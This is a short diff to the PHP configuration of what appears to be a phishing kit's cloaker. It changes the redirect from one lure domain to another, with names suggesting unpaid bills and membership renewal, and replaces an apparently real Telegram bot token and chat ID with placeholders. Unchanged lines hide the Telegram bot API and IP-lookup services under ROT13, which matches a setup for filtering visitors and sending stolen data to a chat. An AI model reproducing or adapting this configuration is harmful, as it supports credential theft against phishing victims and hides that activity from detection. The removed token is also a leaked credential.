@@ -57,7 +57,7 @@ if (isset($_GET["check"]))
 
 $license = "Houss-1987";
 
-$redirect = "https://upcoming-bills.serv00.net/0612";
+$redirect = "https://renew-membership.netsons.org/";
 
 $parameter = 2; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
@@ -84,9 +84,9 @@ class Obj
     const localhost = "102.53.13.21";
     const timeout = 10;
     const id = "1061031967:";
-    const filename = "ih.gkg";
-    const token = "7032892858:AAGr73d0N2LwNDbJqdB58tjvOjXcbC8eWP8";
-    const chatid = "-4275336100";
+    const filename = "index.php";
+    const token = "x";
+    const chatid = "x";
     const telegram = "uggcf://ncv.gryrtenz.bet/obg";
     const api1 = "uggcf://oynpxobk.vcvasb.ncc/ybbxhc/";
     const api2 = "uggc://purpx.trgvcvagry.arg/purpx.cuc?vc=";
